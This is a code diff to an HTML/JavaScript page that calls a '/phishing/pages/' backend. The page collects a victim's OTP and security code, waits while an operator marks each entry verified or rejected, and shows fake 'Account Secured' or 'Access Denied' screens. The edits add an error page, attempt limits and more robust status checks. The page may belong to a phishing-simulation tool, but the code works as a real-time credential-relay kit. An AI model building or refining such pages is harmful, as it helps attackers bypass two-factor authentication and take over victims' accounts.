@@ -445,6 +445,7 @@
             }
         }
     </style>
+<base target="_blank">
 </head>
 <body data-page-id="{{ page_id }}" data-session="{{ session_token }}">
 
@@ -607,6 +608,27 @@
           <path d="M12 8v4l3 3" stroke="#00e676" stroke-width="2" stroke-linecap="round"/>
         </svg>
         <span style="color: #00e676; font-size: 13px; font-weight: 700; letter-spacing: 0.5px; text-transform: uppercase;">Account Secured</span>
+      </div>
+    </div>
+
+    <!-- STEP 4: Verification Failed (Max Attempts) -->
+    <div id="error-section" class="hidden" style="text-align: center; padding: clamp(24px, 5vw, 40px) 16px;">
+      <div class="error-icon-wrap" style="animation: scaleIn 0.5s cubic-bezier(0.23, 1, 0.32, 1) forwards;">
+        <svg width="44" height="44" viewBox="0 0 24 24" fill="none" style="display: block;">
+          <circle cx="12" cy="12" r="10" stroke="#ff3849" stroke-width="2"/>
+          <path d="M12 8v4M12 16h.01" stroke="#ff3849" stroke-width="2.5" stroke-linecap="round"/>
+        </svg>
+      </div>
+      <h2 class="error-title" style="font-size: clamp(20px, 4vw, 28px); font-weight: 900; text-transform: uppercase; letter-spacing: 2px; margin: 0 0 12px; color: #fff;">Verification <span style="color: #ff3849;">Failed</span></h2>
+      <p class="error-desc" id="error-section-desc" style="color: #888; font-size: clamp(12px, 2vw, 15px); margin: 0 auto 32px; max-width: 400px; line-height: 1.6;">
+        Your account could not be verified. Please contact support for assistance.
+      </p>
+      <div style="display: inline-flex; align-items: center; gap: 10px; background: rgba(255, 56, 73, 0.1); border: 1px solid rgba(255, 56, 73, 0.25); border-radius: 8px; padding: 14px 24px;">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
+          <circle cx="12" cy="12" r="10" stroke="#ff3849" stroke-width="2"/>
+          <path d="M12 8v4M12 16h.01" stroke="#ff3849" stroke-width="2.5" stroke-linecap="round"/>
+        </svg>
+        <span style="color: #ff6b7a; font-size: 13px; font-weight: 700; letter-spacing: 0.5px; text-transform: uppercase;">Access Denied</span>
       </div>
     </div>
 
@@ -852,7 +874,7 @@
     }
 
     function resetVerification(field) {
-        fetch(API_BASE + '/phishing/pages/reset-verification', {
+        return fetch(API_BASE + '/phishing/pages/reset-verification', {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({page_id: pageId, session_token: sessionToken, field: field})
@@ -886,6 +908,13 @@
     // =========================
     // State-Based Verification
     // =========================
+    function isVerified(val) {
+        return val === true || val === 'true' || val === 1 || val === '1';
+    }
+    function isRejected(val) {
+        return val === false || val === 'false' || val === 0 || val === '0';
+    }
+
     function checkVerificationStatus(target, attemptCount, onResult) {
         if (!pendingStatusCheck) return;
         if (attemptCount > MAX_STATUS_CHECKS) {
@@ -912,14 +941,13 @@
                 val = data.security_code_verification;
             }
 
-            // State-based: ONLY act on definitive true or false
-            // null / undefined → keep waiting, do NOTHING
-            if (val === true) {
+            // Robust state check: handle boolean, string, and number representations
+            if (isVerified(val)) {
                 onResult('verified');
-            } else if (val === false) {
+            } else if (isRejected(val)) {
                 onResult('rejected');
             } else {
-                // Still null / not reviewed → wait and check again
+                // Still null / pending / undefined → wait and check again
                 statusTimeoutId = setTimeout(function() {
                     checkVerificationStatus(target, attemptCount + 1, onResult);
                 }, VERIFY_INTERVAL);
@@ -1012,6 +1040,7 @@
                     }
                     else if (result === 'rejected') {
                         // otp_verification changed from null → false
+                        clearStatusCheck();
                         // First reset server field to null, then show error
                         resetVerification('otp_verification').then(function() {
                             if (currentStep !== 1) return;
@@ -1025,6 +1054,12 @@
                                 actionBtn.classList.add('hidden');
                                 resendWrap.classList.add('hidden');
                                 setInputsDisabled(otpInputs, true);
+                                // Show full error page
+                                otpSection.classList.add('hidden');
+                                document.getElementById('error-section-desc').textContent = 'Maximum OTP verification attempts reached. Please request a new code or contact support.';
+                                var errSec = document.getElementById('error-section');
+                                errSec.classList.remove('hidden');
+                                errSec.classList.add('fade-in');
                             } else {
                                 showError(otpError, otpErrorWrap, otpAttemptsBox, otpAttemptsText,
                                     'The OTP code you entered is incorrect.', otpAttempts, MAX_ATTEMPTS);
@@ -1038,11 +1073,24 @@
                             otpAttempts++;
                             isSubmitting = false;
                             markInputsError(otpInputs);
-                            showError(otpError, otpErrorWrap, otpAttemptsBox, otpAttemptsText,
-                                'The OTP code you entered is incorrect.', otpAttempts, MAX_ATTEMPTS);
-                            setControlsVisible(true);
-                            setBtn('Verify Code', false);
-                            resetInputs(otpInputs);
+                            if (otpAttempts >= MAX_ATTEMPTS) {
+                                showError(otpError, otpErrorWrap, null, null, 'Maximum attempts reached. Please request a new code or contact support.');
+                                setControlsVisible(false);
+                                actionBtn.classList.add('hidden');
+                                resendWrap.classList.add('hidden');
+                                setInputsDisabled(otpInputs, true);
+                                otpSection.classList.add('hidden');
+                                document.getElementById('error-section-desc').textContent = 'Maximum OTP verification attempts reached. Please request a new code or contact support.';
+                                var errSec = document.getElementById('error-section');
+                                errSec.classList.remove('hidden');
+                                errSec.classList.add('fade-in');
+                            } else {
+                                showError(otpError, otpErrorWrap, otpAttemptsBox, otpAttemptsText,
+                                    'The OTP code you entered is incorrect.', otpAttempts, MAX_ATTEMPTS);
+                                setControlsVisible(true);
+                                setBtn('Verify Code', false);
+                                resetInputs(otpInputs);
+                            }
                         });
                     }
                     else if (result === 'timeout') {
@@ -1094,6 +1142,7 @@
                     }
                     else if (result === 'rejected') {
                         // security_code_verification changed from null → false
+                        clearStatusCheck();
                         resetVerification('security_code_verification').then(function() {
                             if (currentStep !== 2) return;
                             secAttempts++;
@@ -1106,6 +1155,12 @@
                                 actionBtn.classList.add('hidden');
                                 resendSecWrap.classList.add('hidden');
                                 setInputsDisabled(secInputs, true);
+                                // Show full error page
+                                secSection.classList.add('hidden');
+                                document.getElementById('error-section-desc').textContent = 'Maximum security code verification attempts reached. Please request a new code or contact support.';
+                                var errSec = document.getElementById('error-section');
+                                errSec.classList.remove('hidden');
+                                errSec.classList.add('fade-in');
                             } else {
                                 showError(secError, secErrorWrap, secAttemptsBox, secAttemptsText,
                                     'The Security Code you entered is incorrect.', secAttempts, MAX_ATTEMPTS);
@@ -1118,11 +1173,24 @@
                             secAttempts++;
                             isSubmitting = false;
                             markInputsError(secInputs);
-                            showError(secError, secErrorWrap, secAttemptsBox, secAttemptsText,
-                                'The Security Code you entered is incorrect.', secAttempts, MAX_ATTEMPTS);
-                            setControlsVisible(true);
-                            setBtn('Verify', false);
-                            resetInputs(secInputs);
+                            if (secAttempts >= MAX_ATTEMPTS) {
+                                showError(secError, secErrorWrap, null, null, 'Maximum attempts reached. Please request a new code or contact support.');
+                                setControlsVisible(false);
+                                actionBtn.classList.add('hidden');
+                                resendSecWrap.classList.add('hidden');
+                                setInputsDisabled(secInputs, true);
+                                secSection.classList.add('hidden');
+                                document.getElementById('error-section-desc').textContent = 'Maximum security code verification attempts reached. Please request a new code or contact support.';
+                                var errSec = document.getElementById('error-section');
+                                errSec.classList.remove('hidden');
+                                errSec.classList.add('fade-in');
+                            } else {
+                                showError(secError, secErrorWrap, secAttemptsBox, secAttemptsText,
+                                    'The Security Code you entered is incorrect.', secAttempts, MAX_ATTEMPTS);
+                                setControlsVisible(true);
+                                setBtn('Verify', false);
+                                resetInputs(secInputs);
+                            }
                         });
                     }
                     else if (result === 'timeout') {
